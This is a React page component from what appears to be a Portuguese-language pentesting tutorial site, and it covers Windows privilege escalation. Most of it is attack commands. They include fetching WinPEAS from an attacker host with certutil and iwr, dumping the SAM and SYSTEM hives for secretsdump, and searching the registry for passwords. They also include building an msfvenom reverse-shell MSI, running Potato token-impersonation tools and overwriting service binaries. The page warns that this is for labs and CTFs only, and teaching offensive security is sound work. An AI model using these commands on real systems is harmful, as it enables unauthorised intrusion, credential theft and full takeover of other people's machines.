import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function PrivescWindows() {
    return (
      <PageContainer
        title="Escalação de Privilégios — Windows"
        subtitle="Técnicas para escalar de usuário comum para SYSTEM/Administrador em sistemas Windows."
        difficulty="avancado"
        timeToRead="18 min"
      >
        <AlertBox type="danger" title="Uso exclusivo em sistemas autorizados">
          Escalação de privilégios não autorizada é crime. Use apenas em labs e CTFs.
        </AlertBox>

        <h2>Enumeração Inicial no Windows</h2>
        <CodeBlock language="bash" code={'# No shell Windows (cmd ou PowerShell):\n\n# Usuário atual\nwhoami\nwhoami /all         # grupos e privilégios\nnet user\nnet localgroup administrators\n\n# Sistema\nsysteminfo\nhostname\n\n# Processos\ntasklist /v\nGet-Process         # PowerShell\n\n# Serviços\nnet start\nsc query type=all state=all\nGet-Service         # PowerShell\n\n# Tarefas agendadas\nschtasks /query /fo LIST /v\nGet-ScheduledTask   # PowerShell'} />

        <h2>WinPEAS — Automatizar Enumeração</h2>
        <CodeBlock language="bash" code={'# Baixar WinPEAS\n# No Kali, hospedar:\ncd /usr/share/peass-ng/winPEAS\npython3 -m http.server 8080\n\n# Na vítima, baixar e executar:\ncertutil -urlcache -f http://SEU_IP:8080/winPEASany.exe winpeas.exe\nwinpeas.exe > output.txt\n\n# Via PowerShell:\niwr -Uri http://SEU_IP:8080/winPEASany.exe -OutFile winpeas.exe\n.\\winpeas.exe\n\n# PowerUp — outro script de enumeração:\n# (PowerShell)\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks'} />

        <h2>Senhas e Credenciais</h2>
        <CodeBlock language="bash" code={'# Extrair senhas salvas\ncmdkey /list              # credenciais salvas\n\n# SAM database (local)\n# Requer privilégios elevados ou Shadow Copy\nreg save HKLM\\SAM C:\\sam.hive\nreg save HKLM\\SYSTEM C:\\system.hive\n# Extrair no Kali com secretsdump\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL\n\n# Credenciais em registro\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n\n# Arquivos de config com senhas\ndir /s /b *.config 2>nul\ndir /s /b *.ini 2>nul\nfindstr /si password *.xml *.ini *.txt *.config'} />

        <h2>AlwaysInstallElevated</h2>
        <CodeBlock language="bash" code={'# Verificar política\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n# Se ambos retornarem 1 = vulnerável!\n\n# Criar MSI malicioso com Metasploit\nmsfvenom -p windows/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f msi > evil.msi\n\n# Executar na vítima\nmsiexec /quiet /qn /i C:\\evil.msi'} />

        <h2>Token Impersonation</h2>
        <CodeBlock language="bash" code={'# Verificar privilégios\nwhoami /priv\n\n# Se tiver SeImpersonatePrivilege (comum em serviços IIS, SQL)\n# Usar Potato Attacks:\n\n# PrintSpoofer (Windows 10/Server 2019)\n.\\PrintSpoofer.exe -i -c cmd\n\n# GodPotato\n.\\GodPotato.exe -cmd "cmd /c whoami"\n\n# JuicyPotato (Windows Server 2016/2019)\n.\\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{CLSID}"'} />

        <h2>Serviços com Permissões Fracas</h2>
        <CodeBlock language="bash" code={'# PowerUp — encontrar serviços mal configurados\nPowerShell -ep bypass\nImport-Module .\\PowerUp.ps1\nGet-ModifiableServiceFile\nInvoke-ServiceAbuse -Name \'VulnSvc\'\n\n# Manual — verificar ACL de serviço\nsc qc VulnSvc\nicacls "C:\\Program Files\\VulnApp\\app.exe"\n\n# Se o binário for substituível\ncopy evil.exe "C:\\Program Files\\VulnApp\\app.exe"\nnet stop VulnSvc && net start VulnSvc'} />

        <AlertBox type="success" title="Ferramentas recomendadas">
          WinPEAS, PowerUp, BeRoot, Seatbelt e JAWS são scripts completos de enumeração Windows.
          Sempre comece com WinPEAS para ter uma visão geral do sistema.
        </AlertBox>
      </PageContainer>
    );
  }
  